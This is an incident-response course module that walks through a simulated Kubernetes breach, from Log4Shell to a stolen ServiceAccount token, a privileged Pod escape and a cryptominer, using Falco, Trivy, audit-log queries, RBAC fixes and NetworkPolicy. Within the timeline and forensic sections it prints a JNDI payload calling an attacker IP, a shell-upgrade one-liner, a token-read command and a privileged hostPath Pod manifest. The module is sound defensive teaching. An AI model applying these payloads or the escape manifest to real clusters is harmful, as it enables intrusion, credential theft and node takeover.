## What this module covers

The third scenario follows an attack on a Kubernetes cluster from a vulnerable library in a public application to a cryptominer with root access on a node. It covers all four objectives of domain 3:

- **3.1** Runtime alerts (**Falco**) and the entry point: the vulnerable image (**Trivy**) and application.
- **3.2** The **Kubernetes audit log**: ServiceAccount token abuse, `exec`, privileged Pods.
- **3.3** The **RBAC** and configuration that made the attack possible.
- **3.4** Containment (**NetworkPolicy**, isolation, rotation), hardening and the report.

After this module you know:

- how to pick "patient zero" and the first moment of compromise out of a pile of Falco alerts;
- how to follow one stolen token through the audit log, and how it differs from legitimate use of the same ServiceAccount;
- why `create pods` across the cluster is practically the same as root on every node;
- what to contain first, what to rotate, and how to write RBAC, NetworkPolicy and a `securityContext` that would have stopped the attack.

The tools are the same as in the CKS course and the Detection and response course: Falco, Trivy, the audit log, `jq` and `yq`. What is new is that you use them together, under pressure, on one incident.

## The story

**Shop d.o.o.** sells equipment through a web shop. Everything runs in one Kubernetes cluster (v1.35, Calico, three worker nodes `node01`–`node03`, control plane `cp01` at `10.0.10.10`):

| Namespace | What runs there |
|---|---|
| `shop` | `storefront` (Java/Spring, public behind `ingress-nginx`), `newsletter`, `postgres` |
| `payments` | `payments-api`, the link to the payment processor |
| `monitoring`, `argocd`, `ops`, `ci` | Prometheus, GitOps, the `cert-checker` CronJob, GitLab runners |

People in the story:

- **Ivana** (SOC, on call) receives the Falco alert and leads the investigation,
- **Marko** (the `shop` team) owns the `storefront` application,
- **Ana** (`payments-ops`) does planned maintenance in `payments` that night,
- **Nikola** (platform team) owns RBAC and the nodes; he is the incident commander.

The background, as found in many companies: the `storefront:2.3.1` image was built in 2021 and never rescanned; `log4j-core` stayed at 2.14.1. In March 2025 the application gained "reading ConfigMaps through the API", and someone, to make it "work right away", granted the `storefront` ServiceAccount a copy of the ops role through a **ClusterRoleBinding**. The namespace has no NetworkPolicy, the container runs as root, and the token is mounted automatically.

### The attack, minute by minute (21 Oct 2026, UTC)

| Time | What happened | Evidence source |
|---|---|---|
| 02:13:06 | HTTP request with `${jndi:ldap://203.0.113.189:1389/a}` in a header; `java` connects to the attacker's LDAP | Falco *Unexpected outbound connection* |
| 02:13:07 | The loaded class starts a reverse shell to `203.0.113.189:4444` | Falco *Redirect STDOUT/STDIN to Network Connection* |
| 02:14:12 | `python3 -c 'import pty; pty.spawn("/bin/bash")'`: a shell with a terminal | Falco *Terminal shell in container* |
| 02:14:40 | `cat /var/run/secrets/kubernetes.io/serviceaccount/token` | Falco (local rule) *Read ServiceAccount token* |
| 02:15:01 | `curl` with the token to `https://10.96.0.1`: lists Pods in `shop` | Falco + audit |
| 02:16:22–40 | Downloads `kubectl` to `/tmp`, runs `kubectl auth can-i --list` | Falco *Drop and execute new binary* + audit |
| 02:16:58–02:17:52 | `list secrets` in `shop`, `get` on three Secrets (one in `payments`) | audit |
| 02:18:05–21 | `list nodes` and creating a ClusterRoleBinding: both **403** | audit |
| 02:19:12 | Creates the privileged Pod `kube-system/node-debug-7f4c` on `node01` with `hostPath: /` | audit (`requestObject`) + Falco *Launch Privileged Container* |
| 02:19:47 | `kubectl exec` into that Pod, `chroot /host` | audit (`pods/exec`, 101) + Falco shell |
| 02:20:02–31 | Reads the node's `/etc/shadow`, adds a root crontab | Falco *Read sensitive file untrusted*, *Schedule Cron Jobs* |
| 02:21:09 | Miner `kswapd0` connects to the pool `198.51.100.142:3333` | Falco *Detect crypto miners using the Stratum protocol* |

Ivana gets the alert at 02:21. The attacker has been in the cluster for eight minutes, and everything they did is visible in two sources: Falco (what happened **inside** containers and on nodes) and the audit log (what was requested **from** the API server).

## The attack chain and MITRE ATT&CK

| Step | Tactic | Technique |
|---|---|---|
| Log4Shell in a public application | Initial Access | T1190 Exploit Public-Facing Application |
| Reverse shell, bash | Execution | T1059.004 Unix Shell |
| Downloaded `kubectl` | Command and Control | T1105 Ingress Tool Transfer |
| Reading the token from `/var/run/secrets/...` | Credential Access | T1528 Steal Application Access Token, T1552.007 Container API |
| `auth can-i --list`, `list pods/namespaces` | Discovery | T1613 Container and Resource Discovery |
| `get secrets` | Credential Access | T1552.007 Unsecured Credentials: Container API |
| Privileged Pod in `kube-system` | Execution, Privilege Escalation | T1610 Deploy Container, T1611 Escape to Host |
| `kubectl exec` | Execution | T1609 Container Administration Command |
| `/etc/shadow` on the node | Credential Access | T1003.008 /etc/passwd and /etc/shadow |
| Root crontab on the node | Persistence | T1053.003 Cron |
| The name `kswapd0`, a Pod called `node-debug` in `kube-system` | Defense Evasion | T1036.004/.005 Masquerading |
| Miner | Impact | T1496 Resource Hijacking |

Microsoft's **Threat Matrix for Kubernetes** has the same steps under the names "Exposed sensitive interfaces / Application exploit", "Access container service account", "List K8s secrets", "Privileged container", "Writable hostPath mount". The ATT&CK Containers matrix and that one complement each other; use ATT&CK in the report, because the rest of the SOC understands it.

## Phase 1: Falco alerts and patient zero (3.1)

Falco exports alerts as JSON (stdout, a file or Falcosidekick). Each alert has `time`, `rule`, `priority`, `hostname`, `tags` and `output_fields` with Kubernetes context:

```bash
F=falco-alerts.jsonl
jq -r '[.time, .hostname, .priority, .rule, .output_fields."k8s.ns.name", .output_fields."k8s.pod.name"] | @tsv' $F
jq -r '.rule' $F | sort | uniq -c | sort -rn          # which rules fire the most
jq -r 'select(.priority=="Critical") | [.time, .rule, .output_fields."k8s.pod.name"] | @tsv' $F
```

The alert that woke up the on-call engineer (the miner on `node01`) is a **consequence**. Patient zero is the Pod where code execution that does not belong to the application appears first. Grouping by Pod shows the chain:

```bash
jq -r '.output_fields."k8s.pod.name"' $F | sort | uniq -c | sort -rn
jq -r 'select(.output_fields."k8s.pod.name"=="storefront-7d9c6b5f4-x2kqp")
  | [.time, .rule, (.output_fields."fd.name" // .output_fields."proc.cmdline")] | @tsv' $F
```

How to read the individual alerts:

| Rule | What it means here | False positive when |
|---|---|---|
| *Unexpected outbound connection* (local, with an allowlist) | `java` opens a connection to `:1389`: a typical JNDI/LDAP callback | A new SaaS integration not on the allowlist (see `newsletter` at 01:38) |
| *Redirect STDOUT/STDIN to Network Connection in Container* | `dup2` of stdin/stdout onto a socket: a reverse shell | Rarely; some debug tools |
| *Terminal shell in container* | A shell with a TTY (`proc.tty != 0`) | An administrator's `kubectl exec -it` (Ana in `payments`) |
| *Read ServiceAccount token* (local) | A process outside the allowlist reads the token | A sidecar or agent that reads it legitimately |
| *Contact K8S API Server From Container* | A container that normally does not talk to the API now does | Operators and CronJobs (`cert-checker`) |
| *Drop and execute new binary in container* | A file that is not in the image (upper layer) is executed | CI runners that build and run binaries |
| *Launch Privileged Container* | A container started with `privileged: true` | CNI, CSI and monitoring agents in `kube-system` |
| *Detect crypto miners using the Stratum protocol* | `stratum+tcp://` in the command line | Almost never |

Two alerts are **not** part of the attack, and that should be written down: the shell in `payments` at 01:55 matches Ana's `kubectl exec` in the audit log (user `oidc:ana.jovanovic@shop.local`, planned maintenance), and the `ci` and `ops` alerts repeat every day. Always confirm dismissed noise with another source, not an assumption.

`hostname` in the alert is the node. Patient zero is on `node02` and the miner on `node01`: the attacker moved from node to node through the API server, not through the network. That is the first hint that the problem is RBAC, not just a vulnerable application.

## Entry point: the vulnerable image (3.1)

Falco says **that** `java` started a shell, but not **how**. Connect it with the image from the Deployment and the Trivy report:

```bash
yq '.spec.template.spec.containers[].image' storefront-deployment.yaml
T=trivy-storefront-2.3.1.json
jq -r '.Results[] | .Target as $t | .Vulnerabilities[]? | [$t, .VulnerabilityID, .PkgName, .InstalledVersion, .FixedVersion, .Status, .Severity, .CVSS.nvd.V3Score] | @tsv' $T
jq '.Metadata.ImageConfig.config.User // "not set (root)"' $T
```

| Finding | Score | Matches the evidence? |
|---|---|---|
| CVE-2021-44228 (Log4Shell), `log4j-core` 2.14.1 | CRITICAL, 10.0, in CISA KEV | Yes: `java` connects to LDAP port 1389, then starts `sh` |
| CVE-2021-45046, -45105, -44832 | 9.0, 5.9, 6.6 | Same library; fixing all of them requires 2.17.1 |
| CVE-2023-45853, `zlib1g` | CRITICAL, 9.8, `will_not_fix` | No: the vulnerable part is MiniZip, which the application does not use; Debian does not fix it |
| `jackson-databind` CVE-2022-42003/42004 | HIGH, DoS | Does not lead to code execution |

Log4Shell works like this: Log4j 2 up to 2.14.1 resolves *lookups* in the messages it logs. If the application logs `User-Agent`, the string `${jndi:ldap://attacker/a}` makes the JVM contact the attacker's LDAP server through JNDI, which returns a reference to a Java class; the class is loaded and executed with the application's privileges. That is why the first Falco alert is an **outbound** connection from the `java` process, not inbound traffic.

Priority is not only CVSS. The questions from the CySA+ course: is the vulnerability in the KEV catalog (actively exploited), is it reachable (public endpoint, the vulnerable function is used), is there a fix. `zlib1g` is CRITICAL on paper but not reachable; Log4Shell is reachable from the internet without authentication.

The Trivy report has one more finding that is not a CVE: `ImageConfig` has no `User`, so the container runs as **root**. That did not enable the entry, but it made everything after it easier for the attacker.

## Phase 2: the audit log and the stolen token (3.2)

Falco sees `curl` and `kubectl` going to `10.96.0.1:443`. The audit log says what they asked for. Every record has who (`user`), from where (`sourceIPs`, `userAgent`), what (`verb`, `objectRef`, `requestURI`), the outcome (`responseStatus.code`) and why it was allowed (`annotations`):

```json
{"level":"Metadata","stage":"ResponseComplete","verb":"get",
 "requestURI":"/api/v1/namespaces/payments/secrets/payments-db",
 "user":{"username":"system:serviceaccount:shop:storefront",
   "extra":{"authentication.kubernetes.io/pod-name":["storefront-7d9c6b5f4-x2kqp"],
            "authentication.kubernetes.io/node-name":["node02"],
            "authentication.kubernetes.io/credential-id":["JTI=…"]}},
 "sourceIPs":["10.244.2.17"],"userAgent":"kubectl/v1.29.3 (linux/amd64) kubernetes/6813625",
 "objectRef":{"resource":"secrets","namespace":"payments","name":"payments-db"},
 "responseStatus":{"code":200},
 "annotations":{"authorization.k8s.io/decision":"allow",
   "authorization.k8s.io/reason":"RBAC: allowed by ClusterRoleBinding \"storefront-ops\" of ClusterRole \"storefront-ops\" to ServiceAccount \"storefront/shop\""}}
```

Three fields are key for tokens:

- `user.extra` of a **bound** ServiceAccount token (the default since v1.24) carries the name and UID of the Pod and node the token was issued for, plus the `credential-id` (JTI). If the token is used from an IP address that is not that Pod's IP, it was stolen and taken out of the cluster.
- `userAgent` separates the application (`fabric8-kubernetes-client`) from the attacker (`curl`, `kubectl/v1.29.3`). It is easy to fake, but a change from the usual is a strong signal.
- `authorization.k8s.io/reason` names exactly the binding that allowed the request. You do not have to guess which of dozens of bindings is the problem.

Queries, from broad to narrow:

```bash
A=audit.log
SA=system:serviceaccount:shop:storefront
jq -r '.user.username' $A | sort | uniq -c | sort -rn | head                 # who talks the most
jq -r --arg sa $SA 'select(.user.username==$sa) | .userAgent' $A | sort | uniq -c
jq -r --arg sa $SA 'select(.user.username==$sa and (.userAgent|startswith("fabric8")|not))
  | [.requestReceivedTimestamp, .verb, .objectRef.resource, .objectRef.subresource,
     .objectRef.namespace, .objectRef.name, .responseStatus.code] | @tsv' $A
# token used from an IP address other than the IP of the Pod in the token
jq -r 'select(.user.extra."authentication.kubernetes.io/pod-name") | [.user.extra."authentication.kubernetes.io/pod-name"[0], .sourceIPs[0]] | @tsv' $A | sort -u
```

What you read from the attacker's requests:

- **`create selfsubjectrulesreviews`** is `kubectl auth can-i --list`: the attacker asks the API what they are allowed to do. The application never does that, so it is a good detection signal.
- **`list secrets`** in `shop` returns the **contents** of all Secrets in the namespace, not just the names. That is why all Secrets in `shop` (`registry-pull` and `shop-tls` too) must be rotated, even though the attacker did not ask for them by name. The `get` requests for `postgres-credentials`, `stripe-api-key` and `payments/payments-db` are what they targeted.
- **403** on `list nodes` and `create clusterrolebindings` means the attacker tried cluster-level expansion and persistence, and RBAC did stop them there. Failed requests are evidence of intent and belong in the timeline.
- **`create pods`** in `kube-system`: the audit policy logs Pods at the `Request` level, so the whole manifest is in `requestObject`.
- **`create pods/exec`** with code **101** (Switching Protocols) is a successful interactive `exec`. Newer `kubectl` uses WebSocket and that request may be logged as `get`; so filter on `objectRef.subresource=="exec"`, not on the verb.

### The privileged Pod

```bash
jq 'select(.verb=="create" and .objectRef.resource=="pods" and .objectRef.subresource==null
      and ([.requestObject.spec.containers[]?.securityContext.privileged] | any)) | .requestObject.spec' $A
```

```yaml
spec:
  nodeName: node01            # bypasses the scheduler: no pods/binding from kube-scheduler
  hostPID: true               # sees and signals the node's processes
  hostNetwork: true           # the node's network stack, bypasses NetworkPolicy
  tolerations: [{operator: Exists}]
  containers:
    - image: docker.io/library/alpine:3.20
      securityContext: {privileged: true}   # all devices, all capabilities, no seccomp/AppArmor
      volumeMounts: [{name: host, mountPath: /host}]
  volumes:
    - name: host
      hostPath: {path: /}     # the node's entire file system, read-write
```

`privileged` + `hostPath: /` + `chroot /host` is a root shell on the node. From there the attacker reads `/etc/shadow`, the kubelet credentials (`/var/lib/kubelet/pki`), the tokens of every Pod on that node (`/var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/`) and adds a cron job. The name `node-debug` and the `kube-system` namespace are chosen to look like an administrator's tool, and `kube-system` usually has no Pod Security enforce label, so admission does not block it.

## Phase 3: the RBAC and configuration that made it possible (3.3)

```yaml
kind: ClusterRole
metadata: {name: storefront-ops}
rules:
  - apiGroups: [""]
    resources: ["pods", "pods/log", "pods/exec", "services", "configmaps", "secrets", "namespaces"]
    verbs: ["get", "list", "watch", "create", "delete"]
---
kind: ClusterRoleBinding        # applies in ALL namespaces
metadata: {name: storefront-ops}
subjects: [{kind: ServiceAccount, name: storefront, namespace: shop}]
roleRef: {kind: ClusterRole, name: storefront-ops}
```

What is dangerous here, in order of severity:

| Permission | Why it is dangerous |
|---|---|
| `create pods` through a ClusterRoleBinding | A Pod in any namespace, with any ServiceAccount of that namespace and any `securityContext` admission lets through. In a namespace without Pod Security protection that is root on the node |
| `get/list secrets` through a ClusterRoleBinding | Every Secret in the cluster, including other namespaces (`payments`) |
| `create pods/exec` | A shell in any Pod, including Pods with stronger ServiceAccounts |
| ClusterRoleBinding instead of RoleBinding | The same ClusterRole through a RoleBinding in `shop` would have limited the damage to `shop` |
| `namespaces` list | A map of the cluster for the attacker |

The application only needed `get` on `configmaps/storefront-config`, and that is visible in the audit log (all `fabric8` requests). The principle: permissions are derived from actual use, not from "what might be needed".

```bash
jq -r 'select(.userAgent|startswith("fabric8")) | [.verb, .objectRef.resource, .objectRef.name] | @tsv' $A | sort | uniq -c
yq 'select(.kind=="ClusterRoleBinding") | [.metadata.name, .roleRef.name, (.subjects[] | .kind + "/" + (.namespace // "") + "/" + .name)]' rbac.yaml
```

Other configuration gaps that did not enable the attack by themselves but made it easier:

- **an automatically mounted token** in a publicly exposed container; the default token injected by admission is extended to up to a year (`--service-account-extend-token-expiration`), while an explicit `projected` token with `expirationSeconds: 600` expires in 10 minutes,
- **no NetworkPolicy**: `java` could reach `203.0.113.189:1389`, and the miner could reach the pool,
- **root in the container** and a writable root file system: `python3`, `curl` and `/tmp/kubectl` worked without obstacles,
- **`kube-system` without Pod Security** restrictions, and no admission policy that forbids `privileged` and `hostPath` outside a list of allowed Pods.

## Decision points: what first

At 02:30 Ivana and Nikola have an active attacker with a token, root on `node01` and a miner. The order:

| # | Decision | Why at that moment |
|---|---|---|
| 1 | Preserve evidence: export the audit log and Falco alerts, `kubectl get pod -o yaml`, Pod logs | Deleting a Pod deletes part of the evidence; the export takes a minute |
| 2 | Delete the `storefront-ops` ClusterRoleBinding | Immediately stops everything the attacker does with the token, across the cluster; the application only loses ConfigMap reads |
| 3 | Network-isolate `node01` and the `storefront` Pod (NetworkPolicy, node firewall) and block `203.0.113.189` and `198.51.100.142` on egress | Cuts C2 and the miner without losing evidence on disk |
| 4 | `cordon` `node01`, snapshot the disk, then delete `node-debug-7f4c` | The attacker has root on the node; the node is no longer considered clean |
| 5 | Isolate, then delete Pod `x2kqp` | The bound token of that Pod stops being valid when the Pod is deleted |
| 6 | Rotate Secrets and node credentials | The attacker has them; rotate only once access is cut, otherwise they steal the new ones |

Why not `kubectl delete pod` right away: it would invalidate the token, but the attacker would still have root on `node01` (cron, and possibly the kubelet credential), and the contents of `/tmp` in the container would be lost. Why not rotation right away: while the attacker holds a token with `get secrets`, they will read the new values too.

## Containment, eradication, recovery (3.4)

Containment (commands for a real cluster; in the lab you work on manifests):

```bash
kubectl delete clusterrolebinding storefront-ops
kubectl -n shop label pod storefront-7d9c6b5f4-x2kqp app- quarantine=true   # leaves the ReplicaSet and Service
kubectl apply -f quarantine-deny-all.yaml                                    # NetworkPolicy for quarantine=true
kubectl apply -f networkpolicy.yaml                                          # default-deny + allow for shop
kubectl cordon node01
kubectl -n kube-system get pod node-debug-7f4c -o yaml > dokazi/node-debug-7f4c.yaml
kubectl -n kube-system delete pod node-debug-7f4c
```

NetworkPolicy for the namespace (shortened; the full version is in the lab):

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: {name: default-deny, namespace: shop}
spec:
  podSelector: {}
  policyTypes: ["Ingress", "Egress"]
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: {name: storefront, namespace: shop}
spec:
  podSelector: {matchLabels: {app: storefront}}
  policyTypes: ["Ingress", "Egress"]
  ingress:
    - from: [{namespaceSelector: {matchLabels: {kubernetes.io/metadata.name: ingress-nginx}}}]
      ports: [{protocol: TCP, port: 8080}]
  egress:
    - to: [{podSelector: {matchLabels: {app: postgres}}}]
      ports: [{protocol: TCP, port: 5432}]
    - to: [{namespaceSelector: {matchLabels: {kubernetes.io/metadata.name: kube-system}}, podSelector: {matchLabels: {k8s-app: kube-dns}}}]
      ports: [{protocol: UDP, port: 53}, {protocol: TCP, port: 53}]
    - to: [{ipBlock: {cidr: 10.0.10.10/32}}]       # API server after DNAT of 10.96.0.1:443
      ports: [{protocol: TCP, port: 6443}]
```

NetworkPolicy would not have prevented the token abuse: the API server has to stay reachable for the application. It cuts the LDAP callback (the entry), the reverse shell, the `kubectl` download and the miner. RBAC solves the token. A Pod with `hostNetwork: true` is not covered by NetworkPolicy at all, which is one more reason to block such Pods at admission.

Eradication:

- **`node01` is rebuilt** from a clean image (drain, remove from the cluster, new node). The attacker had root on the host; cleaning up the cron job is not enough.
- Check the other nodes and the Pods on `node01` during 02:19–02:30: the tokens of those Pods were readable through `hostPath`.
- Rotate the `node01` kubelet credential (comes with the new node) and the `bootstrap-token` if it was readable.
- Remove the `storefront:2.3.1` image from the registry or mark it as blocked.

Rotation (everything the attacker could have read):

| What | Why |
|---|---|
| `shop/postgres-credentials`, `shop/stripe-api-key`, `payments/payments-db` | Read individually (`get`) |
| `shop/registry-pull`, `shop/shop-tls` | Returned through `list secrets` in `shop` |
| The `storefront` ServiceAccount token | Invalid once the Pod is deleted; confirm in the audit log that it is not used afterwards |
| Passwords from the node's `/etc/shadow`, the node's SSH keys | They read `/etc/shadow` as root |
| The Stripe key in Stripe as well | Check Stripe logs for use from unknown IP addresses |

Recovery and hardening: `storefront:2.4.0` with `log4j-core` 2.17.1, a new `securityContext` and a least-privilege Role.

```yaml
spec:
  template:
    spec:
      serviceAccountName: storefront
      automountServiceAccountToken: false     # the token only explicitly, short-lived
      securityContext:
        runAsNonRoot: true
        runAsUser: 10001
        seccompProfile: {type: RuntimeDefault}
      containers:
        - name: storefront
          image: registry.shop.local/shop/storefront:2.4.0
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true      # no /tmp/kubectl or /tmp/.x/kswapd0 outside the emptyDir
            capabilities: {drop: ["ALL"]}
          volumeMounts:
            - {name: tmp, mountPath: /tmp}
            - {name: sa-token, mountPath: /var/run/secrets/kubernetes.io/serviceaccount, readOnly: true}
      volumes:
        - {name: tmp, emptyDir: {sizeLimit: 256Mi}}
        - name: sa-token
          projected:
            sources:
              - serviceAccountToken: {path: token, expirationSeconds: 600}
              - configMap: {name: kube-root-ca.crt, items: [{key: ca.crt, path: ca.crt}]}
              - downwardAPI: {items: [{path: namespace, fieldRef: {fieldPath: metadata.namespace}}]}
```

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata: {name: storefront-config-reader, namespace: shop}
rules:
  - apiGroups: [""]
    resources: ["configmaps"]
    resourceNames: ["storefront-config"]
    verbs: ["get"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata: {name: storefront-config-reader, namespace: shop}
subjects: [{kind: ServiceAccount, name: storefront, namespace: shop}]
roleRef: {apiGroup: rbac.authorization.k8s.io, kind: Role, name: storefront-config-reader}
```

Even if the attacker gets a shell again, with this token they can read only one ConfigMap, cannot write to the file system outside `/tmp`, are not root and cannot reach anything except the database, DNS and the API.

## Detections that would have caught the attack earlier

| Control | Where it would have stopped or caught it | Type |
|---|---|---|
| Trivy gate in CI: block CRITICAL with a fix or from the KEV catalog | Image 2.3.1 would not pass regular rescanning | Preventive |
| Egress NetworkPolicy (default-deny) | The LDAP callback at 02:13:06 would fail: no entry | Preventive |
| Falco: shell or `curl`/`wget` in `storefront` → automatic response (Falcosidekick + Talon: isolate the Pod) | 02:14, four minutes before the Secrets | Detective + response |
| Falco rule for token reads (below) | 02:14:40 | Detective |
| Audit alert: `selfsubjectrulesreviews` or `secrets` from an application ServiceAccount | 02:16:41 | Detective |
| Audit alert: token used from an IP address other than the Pod's IP | Immediately, if the token is taken out | Detective |
| Pod Security Admission `restricted` on application namespaces, `ValidatingAdmissionPolicy` against `privileged`/`hostPath` everywhere | 02:19:12: the Pod would be rejected | Preventive |
| Periodic review of ClusterRoleBindings to application ServiceAccounts | Months before the attack | Preventive |

The Falco rule for token reads (the local rule from this scenario):

```yaml
- list: sa_token_readers
  items: [java, fluent-bit, vault-agent]
- rule: Read ServiceAccount token
  desc: A process outside the allowlist reads the ServiceAccount token in a container
  condition: >
    open_read and container
    and fd.name startswith /var/run/secrets/kubernetes.io/serviceaccount/
    and fd.name endswith /token
    and not proc.name in (sa_token_readers)
  output: ServiceAccount token read by unexpected process (file=%fd.name proc=%proc.name cmdline=%proc.cmdline k8s_pod=%k8s.pod.name)
  priority: WARNING
  tags: [container, k8s, mitre_credential_access, T1528]
```

Audit detection for privileged Pods (jq for now, the same logic as a Sigma or KQL rule in the SIEM):

```bash
jq -c 'select(.verb=="create" and .objectRef.resource=="pods" and .objectRef.subresource==null and .responseStatus.code==201)
  | select([.requestObject.spec.containers[]?.securityContext.privileged] | any
           or .requestObject.spec.hostPID == true
           or ([.requestObject.spec.volumes[]?.hostPath.path] | index("/")))
  | {t: .requestReceivedTimestamp, who: .user.username, ns: .objectRef.namespace, pod: .objectRef.name}' audit.log
```

An admission policy that would have rejected `node-debug-7f4c` (CEL, `ValidatingAdmissionPolicy`, GA since v1.30; it comes with a `ValidatingAdmissionPolicyBinding` with exceptions for CNI and agents):

```yaml
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicy
metadata: {name: no-privileged-no-hostpath}
spec:
  matchConstraints:
    resourceRules: [{apiGroups: [""], apiVersions: ["v1"], operations: ["CREATE", "UPDATE"], resources: ["pods"]}]
  validations:
    - expression: "!object.spec.containers.exists(c, has(c.securityContext) && has(c.securityContext.privileged) && c.securityContext.privileged)"
      message: "privileged containers are not allowed"
    - expression: "!has(object.spec.volumes) || !object.spec.volumes.exists(v, has(v.hostPath))"
      message: "hostPath volumes are not allowed"
```

## The report

The structure is the same as in the other scenarios, with Kubernetes specifics:

1. **Summary** (three sentences for management): Log4Shell in the shop, overly broad RBAC permissions, root on one node, a miner; database and payment Secrets leaked and were rotated.
2. **Timeline** in UTC, from both sources, with the source next to each line.
3. **Root cause**: technical (CVE, root in the container) and organizational (a ClusterRoleBinding "temporary" since 2025, an image never rescanned).
4. **Scope**: which namespaces, Secrets, nodes; what was **not** affected and how you know it (403 on `nodes` and `clusterrolebindings`, no token use outside the Pod).
5. **Containment, eradication, recovery** with times.
6. **Recommendations** with an owner and a deadline.

Metrics: MTTD is the time from 02:13:06 to an alert someone looked at (02:21, about 8 minutes, but only once the miner was already running); the real lessons-learned question is why the alerts at 02:13 and 02:14 woke no one. The answer is usually priority (*Notice*) and noise: the *Terminal shell in container* rule also fires on legitimate `kubectl exec`.

## Links to other courses

- [CKS: RBAC and ServiceAccount](#/05-cks/m/03-rbac-i-serviceaccount): Role vs ClusterRole, bound tokens, `automountServiceAccountToken`.
- [CKS: Audit logs](#/05-cks/m/11-audit-logovi): audit policy, `Metadata`/`Request`/`RequestResponse` levels, stages.
- [CKS: Runtime security](#/05-cks/m/12-runtime-security): Falco rules, macros and output fields.
- [CKS: NetworkPolicy and CIS](#/05-cks/m/01-networkpolicy-i-cis): default-deny and egress rules.
- [CKS: Pod Security and Secrets](#/05-cks/m/07-pod-security-i-secrets): Pod Security Admission, `securityContext`.
- [CKS: Images and static analysis](#/05-cks/m/09-slike-i-staticka-analiza): Trivy on images.
- [CKA: RBAC and access](#/04-cka/m/04-rbac-i-pristup) and [CKA: Network Policy](#/04-cka/m/09-network-policy): the basics.
- [Detection and response: Cloud and Kubernetes logs](#/07-detekcija-i-odgovor/m/02-cloud-i-kubernetes-logovi): investigating the audit log with `jq`.
- [Detection and response: Falco](#/07-detekcija-i-odgovor/m/07-falco) and [Containment and runbooks](#/07-detekcija-i-odgovor/m/10-obuzdavanje-i-runbookovi): isolating a Pod.
- [DevSecOps: Containers](#/06-devsecops/m/08-kontejneri) and [SCA and dependencies](#/06-devsecops/m/06-sca-i-zavisnosti): scanning and a gate in CI.
- [CySA+: Analysis and prioritization](#/09-cysa/m/07-analiza-i-prioritizacija): KEV, reachability and CVSS.
- [Security foundations: MITRE ATT&CK](#/01-sigurnosni-temelji/m/06-mitre-attack): mapping techniques.
